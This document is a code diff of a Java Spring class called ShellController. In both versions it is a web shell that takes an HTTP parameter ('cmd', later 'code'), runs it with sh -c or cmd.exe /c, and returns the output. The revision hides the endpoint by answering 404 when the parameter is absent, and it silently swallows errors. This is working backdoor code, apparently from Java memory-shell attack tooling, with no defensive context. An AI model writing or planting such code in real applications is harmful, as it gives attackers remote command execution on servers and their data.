@@ -7,31 +7,38 @@ import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.PrintWriter;
 import java.util.Scanner;
 
 public class ShellController {
 
 
 
-    public void exec() throws Exception {
+    public void exec() {
         // 获取request和response对象
         HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
         HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
-        if (request.getParameter("cmd") != null) {
-            boolean isLinux = true;
-            String osTyp = System.getProperty("os.name");
-            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
-                isLinux = false;
+        try {
+            String arg0 = request.getParameter("code");
+            PrintWriter writer = response.getWriter();
+            if (arg0 != null) {
+                String o = "";
+                java.lang.ProcessBuilder p;
+                if(System.getProperty("os.name").toLowerCase().contains("win")){
+                    p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
+                }else{
+                    p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
+                }
+                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
+                o = c.hasNext() ? c.next(): o;
+                c.close();
+                writer.write(o);
+                writer.flush();
+                writer.close();
+            }else{
+                response.sendError(404);
             }
-            String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
-            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
-            Scanner s = new Scanner(in).useDelimiter("\\A");
-            String output = s.hasNext() ? s.next() : "";
-            System.out.println(output);
-            response.getWriter().write(output);
-            response.getWriter().flush();
-            //Exception e=new Exception(output);
-            //throw e;
+        }catch (Exception e){
         }
     }
 
